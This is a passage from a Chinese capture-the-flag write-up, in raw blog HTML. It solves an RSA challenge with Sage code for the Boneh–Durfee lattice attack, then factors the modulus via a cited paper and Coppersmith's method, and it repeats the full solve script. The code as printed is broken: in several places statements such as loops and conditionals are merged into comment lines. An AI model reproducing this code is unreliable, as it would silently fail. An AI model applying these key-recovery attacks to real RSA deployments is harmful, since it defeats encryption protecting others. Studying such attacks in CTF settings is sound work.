class="line">    <span class="comment"># nothing happened  </span></span><br><span class="line">    <span class="keyword">return</span> BB  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot; Returns:  </span></span><br><span class="line"><span class="string">* 0,0   if it fails  </span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound  </span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May  </span></span><br><span class="line"><span class="string">    finds a solution if:    </span></span><br><span class="line"><span class="string">    * d &lt; N^delta    </span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta    </span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5    </span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)  </span></span><br><span class="line">    PR.&lt;u,x,y&gt; = PolynomialRing(ZZ)  </span><br><span class="line">    Q = PR.quotient(x * y + <span class="number">1</span> - u)  <span class="comment"># u = xy + 1  </span></span><br><span class="line">    polZ = Q(pol).lift()  </span><br><span class="line">  </span><br><span class="line">    UU = XX * YY + <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># x-shifts  </span></span><br><span class="line">    gg = []  </span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):  </span><br><span class="line">            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk  </span><br><span class="line">            gg.append(xshift)  </span><br><span class="line">    gg.sort()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># x-shifts list of monomials  </span></span><br><span class="line">    monomials = []  </span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:  </span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():  </span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  </span><br><span class="line">                monomials.append(monomial)  </span><br><span class="line">    monomials.sort()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)  </span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):  </span><br><span class="line">            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)  </span><br><span class="line">            yshift = Q(yshift).lift()  </span><br><span class="line">            gg.append(yshift)  <span class="comment"># substitution  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># y-shifts list of monomials    for jj in range(1, tt + 1):  </span></span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):  </span><br><span class="line">            monomials.append(u ^ kk * y ^ jj)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># construct lattice B  </span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)  </span><br><span class="line">    BB = Matrix(ZZ, nn)  </span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):  </span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  </span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):  </span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():  </span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice  </span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:  </span><br><span class="line">        <span class="comment"># automatically remove  </span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="number">1</span>)  </span><br><span class="line">        <span class="comment"># reset dimension  </span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]  </span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failure&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># check if vectors are helpful  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        helpful_vectors(BB, modulus ^ mm)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded  </span></span><br><span class="line">    det = BB.det()  </span><br><span class="line">    bound = modulus ^ (mm * nn)  </span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:  </span><br><span class="line">        <span class="comment"># print(&quot;We do not have det &lt; bound. Solutions might not be found.&quot;)  </span></span><br><span class="line">        <span class="comment"># print(&quot;Try with highers m and t.&quot;)        if debug:  </span></span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)  </span><br><span class="line">            <span class="comment"># print(&quot;size det(L) - size e^(m*n) = &quot;, floor(diff))  </span></span><br><span class="line">        <span class="keyword">if</span> strict:  </span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># display the lattice basis  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        matrix_overview(BB, modulus ^ mm)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># LLL  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    BB = BB.LLL()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;LLL is done!&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)  </span><br><span class="line">    found_polynomials = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):  </span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials  </span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)  </span><br><span class="line">            pol1 = pol2 = <span class="number">0</span>  </span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):  </span><br><span class="line">                pol1 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)  </span><br><span class="line">                pol2 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># resultant  </span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)  </span><br><span class="line">            rr = pol1.resultant(pol2)  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># are these good polynomials?  </span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="comment"># print(&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx)  </span></span><br><span class="line">                found_polynomials = <span class="literal">True</span>  </span><br><span class="line">                <span class="keyword">break</span>        <span class="keyword">if</span> found_polynomials:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:  </span><br><span class="line">        <span class="comment"># print(&quot;no independant vectors could be found. This should very rarely happen...&quot;)  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    rr = rr(q, q)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># solutions  </span></span><br><span class="line">    soly = rr.roots()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:  </span><br><span class="line">        <span class="comment"># print(&quot;Your prediction (delta) is too small&quot;)  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]  </span><br><span class="line">    ss = pol1(q, soly)  </span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">#  </span></span><br><span class="line">    <span class="keyword">return</span> solx, soly  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sol</span>(<span class="params">N, e, delta = <span class="number">.271</span></span>):  </span><br><span class="line">    m = <span class="number">8</span>  <span class="comment"># size of the lattice (bigger the better/slower)  </span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span> - <span class="number">2</span> * delta) * m)  <span class="comment"># optimization from Herrmann and May  </span></span><br><span class="line">    X = <span class="number">2</span> * floor(N ^ delta)  <span class="comment"># this _might_ be too much  </span></span><br><span class="line">    Y = floor(N ^ (<span class="number">1</span> / <span class="number">2</span>))  <span class="comment"># correct if p, q are ~ same size  </span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)  </span><br><span class="line">    A = <span class="built_in">int</span>((N + <span class="number">1</span>) / <span class="number">2</span>)  </span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)  </span><br><span class="line">  </span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)  </span><br><span class="line">  </span><br><span class="line">    d = <span class="built_in">int</span>(pol(solx, soly) / e)  </span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d1 = sol(N2, e1, <span class="number">0.276</span>)</span><br><span class="line">d2 = sol(N2, e2, <span class="number">0.276</span>)</span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(hint_ct, d2, N2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(hint).decode())</span><br></pre></td></tr></table></figure><p>可以求出hint：<code>Do you know the contributions of Cortan and Teşeleanu to RSA?</code>，直接搜索Cortan and Teşeleanu可以搜索到一篇文章</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250707233011611.png" alt="Pasted image 20250621185913"></p><p>链接：<a href="https://eprint.iacr.org/2025/380.pdf">A New Generalized Attack on RSA-like Cryptosystems</a></p><p>其中介绍了一种通过关系：</p><script type="math/tex; mode=display">eu-(p^4-1)(q^4-1)v=w</script><p>从$N=pq$中分解出$p,q$的方法，其中：</p><script type="math/tex; mode=display">uv<\frac{2N^4-49N^2+2}{4N+170N^2},|w|<vN</script><p>对上述关系进行变形显然就是：</p><script type="math/tex; mode=display">e=\frac{v(p^4-1)(q^4-1)+w}{u}</script><p>正是本题的情况，那么我们可以通过论文中给出的方式分解出$p,q$：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250707233032417.png" alt="Pasted image 20250621190923"></p><p>在这里$u,v$我们可以通过hint那一步的$d_1=(v+u)x,d_2=(v-u)x$来构造方程求解：</p><script type="math/tex; mode=display">\begin{cases}x=(d_1,d_2)\\v+u=\frac{d_1}{x}\\v-u=\frac{d_2}{x}\end{cases}</script><p>得到$u,v$之后就可以通过如下代码直接分解出$p,q$，从而得到flag了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p_and_q = floor(sqrt(<span class="built_in">abs</span>(<span class="number">2</span> * N1 + sqrt((N1^<span class="number">2</span> + <span class="number">1</span>)^<span class="number">2</span> - (e3 * u) / v))))</span><br><span class="line">p_sub_q = floor(sqrt(<span class="built_in">abs</span>(-<span class="number">2</span> * N1 + sqrt((N1^<span class="number">2</span> + <span class="number">1</span>)^<span class="number">2</span> - (e3 * u) / v))))</span><br><span class="line"></span><br><span class="line">p0 = (p_and_q + p_sub_q) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N1)[]</span><br><span class="line">f = x + p0</span><br><span class="line">f = f.monic()</span><br><span class="line">pad = f.small_roots(X = <span class="number">2</span>^<span class="number">16</span>, beta = <span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line">p = ZZ(p0 + pad[<span class="number">0</span>])</span><br><span class="line">q = N1 // p</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e3, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(flag_ct, d, N1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><br>整道题的完整求解代码如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">flag_ct = ...  </span><br><span class="line">hint_ct = ...  </span><br><span class="line">N1 = ...  </span><br><span class="line">N2 = ...  </span><br><span class="line">e1 = ...  </span><br><span class="line">e2 = ...  </span><br><span class="line">e3 = ...  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">Setting debug to true will display more informations  </span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">debug = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and  </span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct  </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this  </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions  </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is  </span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why  </span></span><br><span class="line"><span class="string">you should probably use `strict = False`  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">strict = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results  </span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can  </span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use  </span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try  </span></span><br><span class="line"><span class="string">disabling it  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">helpful_only = <span class="literal">True</span>  </span><br><span class="line">dimension_min = <span class="number">7</span>  <span class="comment"># stop removing if lattice reaches that dimension  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">############################################  </span></span><br><span class="line"><span class="comment"># Functions  </span></span><br><span class="line"><span class="comment">##########################################  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># display stats on helpful vectors  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):  </span><br><span class="line">    nothelpful = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= modulus:  </span><br><span class="line">            nothelpful += <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># display matrix picture with 0 and X  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):  </span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)  </span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):  </span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii, jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span>  </span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:  </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span>  </span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:  </span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span>  </span><br><span class="line">        <span class="built_in">print</span>(a)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors  </span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):  </span><br><span class="line">    <span class="comment"># end of our recursive function  </span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:  </span><br><span class="line">        <span class="keyword">return</span> BB  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># we start by checking from the end  </span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):  </span><br><span class="line">        <span class="comment"># if it is unhelpful:  </span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:  </span><br><span class="line">            affected_vectors = <span class="number">0</span>  </span><br><span class="line">            affected_vector_index = <span class="number">0</span>  </span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors  </span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">                <span class="comment"># if another vector is affected:  </span></span><br><span class="line">                <span class="comment"># we increase the count                if BB[jj, ii] != 0:  </span></span><br><span class="line">                    affected_vectors += <span class="number">1</span>  </span><br><span class="line">                    affected_vector_index = jj  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># level:0  </span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected            </span></span><br><span class="line">        <span class="comment"># we remove it            if affected_vectors == 0:  </span></span><br><span class="line">                <span class="comment"># print(&quot;* removing unhelpful vector&quot;, ii)  </span></span><br><span class="line">                BB = BB.delete_columns([ii])  </span><br><span class="line">                BB = BB.delete_rows([ii])  </span><br><span class="line">                monomials.pop(ii)  </span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)  </span><br><span class="line">                <span class="keyword">return</span> BB  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># level:1  </span></span><br><span class="line">            <span class="comment"># if just one was affected we check            </span></span><br><span class="line">        <span class="comment"># if it is affecting someone else            elif affected_vectors == 1:  </span></span><br><span class="line">                affected_deeper = <span class="literal">True</span>  </span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">                    <span class="comment"># if it is affecting even one vector  </span></span><br><span class="line">                    <span class="comment"># we give up on this one                    if BB[kk, affected_vector_index] != 0:  </span></span><br><span class="line">                        affected_deeper = <span class="literal">False</span>  </span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and  </span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough                </span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(  </span></span><br><span class="line">                        bound - BB[ii, ii]):  </span><br><span class="line">                    <span class="comment"># print(&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)  </span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])  </span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])  </span><br><span class="line">                    monomials.pop(affected_vector_index)  </span><br><span class="line">                    monomials.pop(ii)  </span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)  </span><br><span class="line">                    <span class="keyword">return</span> BB  </span><br><span class="line">    <span class="comment"># nothing happened  </span></span><br><span class="line">    <span class="keyword">return</span> BB  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot; Returns:  </span></span><br><span class="line"><span class="string">* 0,0   if it fails  </span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound  </span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May  </span></span><br><span class="line"><span class="string">    finds a solution if:    </span></span><br><span class="line"><span class="string">    * d &lt; N^delta    </span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta    </span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)  </span></span><br><span class="line">    PR.&lt;u,x,y&gt; = PolynomialRing(ZZ)  </span><br><span class="line">    Q = PR.quotient(x * y + <span class="number">1</span> - u)  <span class="comment"># u = xy + 1  </span></span><br><span class="line">    polZ = Q(pol).lift()  </span><br><span class="line">  </span><br><span class="line">    UU = XX * YY + <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># x-shifts  </span></span><br><span class="line">    gg = []  </span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):  </span><br><span class="line">            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk  </span><br><span class="line">            gg.append(xshift)  </span><br><span class="line">    gg.sort()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># x-shifts list of monomials  </span></span><br><span class="line">    monomials = []  </span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:  </span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():  </span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  </span><br><span class="line">                monomials.append(monomial)  </span><br><span class="line">    monomials.sort()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)  </span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):  </span><br><span class="line">            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)  </span><br><span class="line">            yshift = Q(yshift).lift()  </span><br><span class="line">            gg.append(yshift)  <span class="comment"># substitution  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># y-shifts list of monomials    for jj in range(1, tt + 1):  </span></span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):  </span><br><span class="line">            monomials.append(u ^ kk * y ^ jj)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># construct lattice B  </span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)  </span><br><span class="line">    BB = Matrix(ZZ, nn)  </span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):  </span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  </span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):  </span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():  </span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice  </span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:  </span><br><span class="line">        <span class="comment"># automatically remove  </span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="number">1</span>)  </span><br><span class="line">        <span class="comment"># reset dimension  </span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]  </span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failure&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># check if vectors are helpful  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        helpful_vectors(BB, modulus ^ mm)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded  </span></span><br><span class="line">    det = BB.det()  </span><br><span class="line">    bound = modulus ^ (mm * nn)  </span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:  </span><br><span class="line">        <span class="comment"># print(&quot;We do not have det &lt; bound. Solutions might not be found.&quot;)  </span></span><br><span class="line">        <span class="comment"># print(&quot;Try with highers m and t.&quot;)        if debug:  </span></span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)  </span><br><span class="line">            <span class="comment"># print(&quot;size det(L) - size e^(m*n) = &quot;, floor(diff))  </span></span><br><span class="line">        <span class="keyword">if</span> strict:  </span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># display the lattice basis  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        matrix_overview(BB, modulus ^ mm)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># LLL  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    BB = BB.LLL()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;LLL is done!&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2  </span></span><br><span class="line">    <span class="keyword">if</span> debug:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)  </span><br><span class="line">    found_polynomials = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span 